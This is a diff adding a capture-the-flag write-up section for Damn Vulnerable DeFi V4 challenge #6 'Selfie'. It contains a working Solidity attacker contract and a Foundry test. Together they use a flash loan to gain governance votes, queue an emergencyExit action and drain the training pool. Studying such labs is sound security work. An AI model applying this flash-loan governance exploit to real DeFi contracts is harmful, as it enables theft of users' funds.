@@ -695,3 +695,57 @@ contract TheRewarderChallenge is Test {
 }
 
 ```
+<br/><br/>
+
+### Day6 - Damn Vulnerable DeFi V4 - #6 Selfie
+
+SelfieAttacker.sol
+```solidity
+contract SelfieAttacker {
+    SelfiePool private immutable pool;
+    SimpleGovernance private immutable governance;
+    DamnValuableVotes private immutable token;
+    address private immutable player;
+    uint256 public actionId;
+
+    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _token, address _player) {
+        pool = _pool;
+        governance = _governance;
+        token = _token;
+        player = _player;
+    }
+
+    function attack() external {
+        uint256 poolBalance = token.balanceOf(address(pool));
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), poolBalance, "");
+    }
+
+    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
+        token.snapshot();
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
+        actionId = governance.queueAction(address(pool), 0, data);
+        token.approve(address(pool), amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function executeAction() external {
+        governance.executeAction(actionId);
+    }
+}
+```
+test_selfie function
+```solidity
+function test_selfie() public checkSolvedByPlayer {
+    // Deploy the attacker contract
+    SelfieAttacker attacker = new SelfieAttacker(pool, governance, token, recovery);
+
+    // Perform the flash loan attack
+    attacker.attack();
+
+    // Advance time by 2 days (governance delay)
+    vm.warp(block.timestamp + 2 days);
+
+    // Execute the governance action
+    attacker.executeAction();
+}
+```
